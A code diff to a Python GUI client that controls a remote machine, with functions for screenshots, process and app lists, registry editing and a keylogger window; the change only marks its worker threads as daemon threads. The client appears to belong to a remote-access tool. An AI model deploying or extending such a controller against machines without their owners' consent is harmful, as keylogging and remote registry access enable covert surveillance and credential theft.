@@ -121,25 +121,25 @@ class Client(object):
                 break
             scrshot.write(data)
         ins = loadimage.WindowScreenShot('capture.png',Toplevel(self.root))
-        scrThread =threading.Thread(target=ins.loadImg())
+        scrThread =threading.Thread(target=ins.loadImg(),daemon=True)
         scrThread.start()
         scrshot.close()
     def command_ShowProcess(self):
         ins = processGUI.Process(self.root,self.IP,self.port_no)
-        processThread=threading.Thread(target=ins.loadProcess())
+        processThread=threading.Thread(target=ins.loadProcess(),daemon=True)
         processThread.start()
     def command_ShowApps(self):
         ins = appGUI.App(self.root,self.IP,self.port_no)
-        processThread=threading.Thread(target=ins.loadApp())
+        processThread=threading.Thread(target=ins.loadApp(),daemon=True)
         processThread.start()
     def command_RegEdit(self):
         regEdit = RegistryWindow(Toplevel(),self.IP,self.port_no)
-        regeditThread = threading.Thread(target=regEdit.loadReg(res='750x500'))
+        regeditThread = threading.Thread(target=regEdit.loadReg(res='750x500'),daemon=True)
         regeditThread.start()
     
     def command_Keylog(self):
         keyloggerGUI = keylogGUI.KeyloggerWindow(Toplevel(),self.IP,self.port_no)
-        keylogThread = threading.Thread(target=keyloggerGUI.loadKeyLog())
+        keylogThread = threading.Thread(target=keyloggerGUI.loadKeyLog(),daemon=True)
         keylogThread.start()
        
 
